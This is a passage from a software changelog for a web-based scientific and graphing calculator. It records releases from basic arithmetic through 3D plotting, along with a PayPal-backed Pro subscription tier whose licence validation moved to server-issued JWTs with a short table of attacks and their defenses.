- `LicenseAPI.issueWithRetry`: handles webhook delay (404 → retry up to 6×, 1.5s between attempts)
- `ProManager.refreshTokenIfNeeded`: auto-renews token when <48 h remaining before JWT expiry
- `ProManager.verifyWithServer`: background re-validation every 6 hours, clears token if KV says cancelled
- PayPal `onApprove` shows live retry progress and a manual retry link on timeout
- Legacy `SUPC-XXXX-XXXX-XXXX` format auto-detected on startup → cleared (no security value)

### Security model

| Attack vector | Defense |
|---|---|
| Forge `subscriptionId` to mint a JWT | ❌ 404 — KV has no such subscription |
| Forge a PayPal webhook | ❌ 401 — signature verification fails without real PayPal cert |
| Reuse a valid JWT after subscription cancel | ❌ 401 — KV state checked on every validate |
| Steal `SECRET_KEY` | ❌ Stored as Cloudflare Worker Secret, never in code or KV |
| DDoS `/license/issue` | 🟡 Not rate-limited yet (planned) |

### Verification

- **Test A** (vulnerability patch): `POST /license/issue` with fake `subscriptionId` returns `404 "subscription not found"` ✅
- **Test B** (KV-backed flow): manually seeded KV `sub:I-TEST-MANUAL-001` with `status=active` → issue succeeded → validate succeeded ✅
- **Test C** (signature verification): PayPal Webhook Simulator events return `401` because the simulator doesn't use the real PayPal cert — confirms verification is active ✅
- **Test D** (revocation): manually flipped KV `status` to `cancelled` → next `validate` returns `401 "subscription no longer active"`, next `issue` returns `403 "subscription not active"` ✅

---

## [3.2.0] - 2026-05-14 — Modular frontend refactor

### Changed

#### 🧩 Modular extraction of Pro module
- **`index.html` reduced from 5,326 → 4,992 lines** (`-334` lines of inline JS).
- **5 standalone JS modules** under `/js/`:
  - `pro-config.js` (~52 lines): central config constants
  - `license-api.js` (~92 lines): Cloudflare Worker JWT client
  - `pro-manager.js` (~188 lines): Pro state management
  - `paypal-integration.js` (~119 lines): PayPal Subscribe button + onApprove handler
  - `pro-ui.js` (~285 lines): modal, badge, plan toggle, init
- Service worker `sw.js` bumped to `v3.2.0` and now caches the 5 JS modules.
- All inline `onclick=` handlers replaced with `addEventListener` (CSP-friendly).

### Removed

- Crockford `makeSegment` / `generateLicenseFromSubscription` (pure-frontend FNV-1a hashing — no actual security value)
- Inline 341-line `<script>` block in `index.html`

### Why modularize

- High cohesion / low coupling
- 200–400 lines per file (target), 800 max
- Easier to review, test, and maintain than a monolithic `index.html`

---

## [3.1.0] - 2026-05-08 — Pro Tier with PayPal Live Subscriptions

### Added

#### 💎 Pro Subscription System
- **Two pricing tiers** with PayPal Smart Subscribe Buttons:
  - **Monthly** — `$2.99 USD / month` (Plan ID `P-7YN578147A145924NNH6Y32I`)
  - **Annual** — `$19.99 USD / year` (Plan ID `P-6XU39039F20435621NH6Y5GI`, ~44% savings)
- **7-day free trial** on both plans, no charge until day 8
- **Production-ready PayPal Live integration** — real subscriptions, real revenue
- **Sandbox credentials retained in source comments** for fast switch-back during development

#### 🔐 License Activation System
- **Auto-generated license code** on successful subscription: `SUPC-XXXX-XXXX-XXXX`
- **Crockford alphabet** — excludes confusable chars `0/O`, `1/I/L` for human-friendly typing
- **Per-character independent FNV-1a hashing** with position salt — eliminates leading-zero patterns
- **localStorage persistence** — license survives browser restart, validates on every load
- **Cross-device recovery** — paste license code into any device to re-activate Pro

#### 🎨 Header Pro Badge (state-aware)
- **`✨ 升級 Pro`** (orange/red gradient) — Free state, click to open upgrade modal
- **`⏱️ 試用 N 天`** (cyan) — Trial active, shows remaining days
- **`💎 Pro`** (gold gradient) — License active, click to view subscription info

#### 🚪 Pro Feature Gates (7 protection points)
- `tangent` — Phase 5 tangent line tool
- `integral` — Phase 5 integral region shading
- `slope` — Phase 5 slope field
- `intersect` — Phase 6 multi-function intersection solver
- `statistics` — Phase 7 statistics mode (histogram / regression / box plot)
- `3d` — Phase 8 3D surface plotting mode
- `svg` — SVG vector export

#### 🎁 Upgrade Modal
- **Side-by-side tier comparison** — Free vs Pro feature lists
- **Monthly / Annual toggle** with auto-computed price equivalent (`$1.67/月 if billed annually`)
- **Trigger-aware messaging** — modal shows which feature blocked entry (e.g., "切線可視化 是 Pro 專屬功能")
- **License entry section** — collapsible, accepts any input format (with/without dashes, lower/upper case)
- **PayPal Subscribe button + Debit/Credit card alternative** — both rendered by PayPal SDK
- **Success state** with copyable license display + Subscription ID

### Architecture
- **`gateProFeature(featureKey, callback)`** helper — wraps any function behind Pro check
- **`ProManager`** state object — `isProActive()`, `hasValidLicense()`, `isTrialActive()`, `setSubscription()`, `reset()`
- **`generateLicenseFromSubscription(subId)`** — deterministic per-subscription license derivation
- **Modular injection** — Pro CSS / HTML / JS designed as 4 separate blocks for clean integration into any single-file app

### Security
- License validation client-side only (MVP — known limitation, suitable for honor-system pricing)
- PayPal handles all payment processing; no credit card data ever touches our origin
- `Secret key` never embedded in client code (Live API secrets only used for backend OAuth, which we don't run)

### Documentation
- Added `docs/PRO_TIER.md` — full technical reference for the Pro module (architecture, API, gating points, PayPal setup walkthrough)
- Updated `README.md` and `README_EN.md` with Pro tier sections

### Verification
- **Local smoke test**: Live PayPal SDK loads without error; Subscribe button renders 2 iframes (PayPal + card) for both Monthly and Annual plans
- **All 7 gates verified**: blocked when Free, unlocked when Trial or Pro
- **Phase 5/6/7/8 features end-to-end tested under Pro**:
  - `x² ∩ (x+6)` returns `{(-2, 4), (3, 9)}` — exact analytical match
  - `N(5, 2)` sample (n=200) → mean `4.952` (within tolerance)
  - `z = sin(x)·cos(y)` renders saddle surface with HSL heat-map
- **License code format check**: regex `/^SUPC-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/` validates both old (Sandbox) and new (Crockford) formats
- **Production deploy verified**: `https://boboidvtw.github.io/` serves 252KB index with `client-id=BAAwe...prky-9L0` (Live)

### Changed
- `index.html` grew from `225 KB` to `252 KB` (+27 KB, +788 LOC) — Pro module fully embedded, single-file architecture preserved

### Known Limitations
- Client-side license validation can be bypassed by tech-savvy users via DevTools (acceptable for v1; backend validation planned for v4 if revenue justifies)
- No automated email delivery of license codes — users see code in success modal and must save it themselves (compensated by `localStorage` persistence)
- License regeneration requires re-subscribing (no "lost license" recovery flow yet — falls back to manual support email)

---

## [3.0.0] - 2026-05-08 — Advanced Math Visualization

### Added

#### 📐 Phase 5 — Calculus Visualization
- **Tangent line tool**: Click any point on a curve to display the tangent line and the numerical derivative value `f'(x)`.
  - Algorithm: central difference formula with `h = 1e-5`.
  - Verified: `d/dx(x²)` at `x=2` returns `4.000` (exact analytical value).
- **Integral shading**: Click two points on a curve to shade the integration region between them and display `∫=value`.
  - Algorithm: Simpson's 1/3 rule with `n=1000` segments.
  - Verified: `∫₋₂³ x² dx` returns `11.667` (analytical: `35/3 ≈ 11.6667`).
- **Slope field**: Visualize the derivative direction over a `22×14` grid across the visible plane.
  - Useful for understanding ODE dynamics and qualitative behavior of derivatives.

#### ⊕ Phase 6 — Equation Solver (Multi-Function Intersections)
- **Bisection-refined intersection finder**: Sweep visible functions in pairs, detect sign changes, and refine roots to `1e-9` precision.
  - Algorithm: 800-point initial scan + bisection (max 60 iterations).
  - Auto-deduplication for nearby candidate roots.
  - Verified: `x² ∩ (x+6)` returns `{-2, 3}` exactly (analytical: roots of `x²-x-6=0`).
- More robust than Newton-Raphson — guaranteed convergence on sign-change intervals, no divergence risk.

#### 📊 Phase 7 — Statistics Mode
- **Histogram**: 12-bin auto-distribution with frequency labels and statistical summary (`n`, `mean`, `σ`, `min`, `max`).
  - Verified: `N(5, 2)` sample (n=200) → `mean=5.052`, `σ=1.955` (within expected tolerance).
- **Scatter + Linear Regression**: Least-squares regression line `y = mx + b` with coefficient of determination `R²`.
  - Verified: `y = 2x + 3 + noise` → regression `y = 1.999x + 3.136`, `R² = 0.9962`.
- **Box Plot**: Five-number summary (`min`, `Q1`, `median`, `Q3`, `max`) with whiskers at `1.5 × IQR` and red outlier markers.
  - Verified: `50 normal + 2 outliers` → correctly identifies `outliers = 2`.

#### 🎲 Phase 8 — 3D Surface Plotting
- **Pure Canvas 2D engine** — no WebGL, no Three.js, zero dependencies.
- Three render styles:
  - **Surface**: Filled quads with HSL heat-map color (low z → blue, high z → red).
  - **Wireframe**: Edge-only rendering for transparent overlay reading.
  - **Contour**: Stepped 10-level color quantization for elevation visualization.
- **Painter's algorithm** for correct depth ordering across `32×32 = 1024` faces.
- **Interactive controls**:
  - Mouse drag → rotate (`rotX`, `rotY`).
  - Scroll wheel → zoom (`0.2× ~ 5×`).
- Auto z-range computation with three-axis indicators (X red, Y green, Z blue).
- Verified: `z = sin(x)·cos(y)` produces a clean saddle surface; `z = sin(√(x²+y²))` produces concentric ripples.

### Architecture
- **3-mode tab system**: Function / Statistics / 3D — toggleable inside the graphing modal.
- **Tool selector** (function mode): Mark / Tangent / Integral / Slope, with dynamic tool hints.
- **Mode dispatch pattern**: `drawGraph` reassigned to `drawGraphDispatch` for backward compatibility while routing by active mode.
- **22 new i18n keys** localized across **4 languages** (zh-TW, en, zh-CN, ja) — 88 strings total.

### Changed
- `super-calc-index.html` grew from ~155 KB to ~225 KB (+700 LOC JS, +80 LOC CSS, +50 LOC HTML).
- Modal layout redesigned with two-tier navigation: mode tabs → tool/control bar → main canvas + side panel.

### Documentation
- Added `docs/PHASE5-8_COMPLETION.md` — full technical completion report with math verification table.
- Added `docs/RELEASE_NOTES.md` — user-facing release information.
- Added `docs/GRAPHING_FEATURE.md` — Phase 0-4 (v2.0) technical reference, retained for archival.
- Updated `README.md` and `README_EN.md` with detailed Phase 5-8 sections.

### Performance
- 3D rendering: ~30-60 fps on `32×32` surface (mid-range hardware).
- Statistics drawing: <50 ms for `n=200` samples.
- Intersection finding: <100 ms for 6 functions over `[-10, 10]` range.

### Known Limitations
- 3D resolution fixed at `32×32` (higher resolutions noticeably slower).
- Statistics charts use single color per chart (no grouping).
- Tangent / integral tools require explicit clicks (no drag-to-adjust).
- Slope field grid density fixed at `22×14`.

---

## [2.0.0] - 2026-05-07 — Function Graphing System

### Added

#### 📈 Multi-Function Plotting
- Display 2-6 functions simultaneously with distinct colors (6-color palette: cyan, purple, green, amber, red, pink).
- Toggle function visibility via checkboxes.
- Auto-scale Y-axis based on combined function ranges.

#### 🎮 Parameter Animation
- Extract parameters (`a, b, c, ...`) from expressions like `a*sin(b*x)`.
- Real-time sliders for parameter manipulation (range `-10` to `+10`, step `0.1`).
- Instant graph redraw on slider change.

#### 📥 Graph Export
- **PNG export** via `canvas.toDataURL()`.
- **SVG export** with full DOM reconstruction (text, paths, legend, theme-aware).

#### 🖱️ Interactive Marking
- Click any curve to mark coordinates with auto-snap (25 px threshold).
- Marked points display location and source function label.

#### 🔍 Special Point Detection
- **Zeros**: Sign-change interpolation between sample points.
- **Extrema**: 3-point derivative approximation (critical points where slope ≈ 0).
- 500-point sampling for accuracy.

### Security
- **XSS prevention**: User expressions (`fn.expr`) escaped via `escapeHTML()` before DOM injection.
- **Expression isolation**: Compiled with `new Function` in isolated scope (no `eval`).
- **Parameter safety**: Single-letter parameter regex excludes reserved math names (`sin`, `cos`, `exp`, ...).

### Fixed
- Scientific notation regex bug: `e` in `2e3` was incorrectly substituted with `Math.E`.
  - Old: `/(?<![a-zA-Z])e(?![a-zA-Z0-9])/g`
  - New: `/(?<![a-zA-Z0-9])e(?![a-zA-Z0-9])/g`

---

## [1.0.0] - 2026-04-21 — Initial Release

### Added
- Basic arithmetic operations (add, subtract, multiply, divide).
- Scientific calculation: trigonometric functions, logarithm, exponent, roots.
- Engineering calculation: base conversion, degree/radian toggle.
- Built-in formula library (Geometry, Physics, Chemistry, Finance).
- Traditional Chinese and English bilingual interface.
- Keyboard shortcut support.
- Calculation history via `localStorage`.
- Responsive design for desktop and mobile.
- MIT License.

---

## [Unreleased]

### Planned
- Multivariable calculus (partial derivatives, double integrals).
- Contour map for `z = f(x, y)` (2D projection of 3D surfaces).
- Animated surface evolution (parameter-driven).
- Histogram + normal distribution overlay.
- 3D cross-section / slice view.
- Export 3D scene as interactive HTML / SVG.
- Slider input debouncing for performance.
- High-DPI canvas scaling.
- PWA support (offline install).
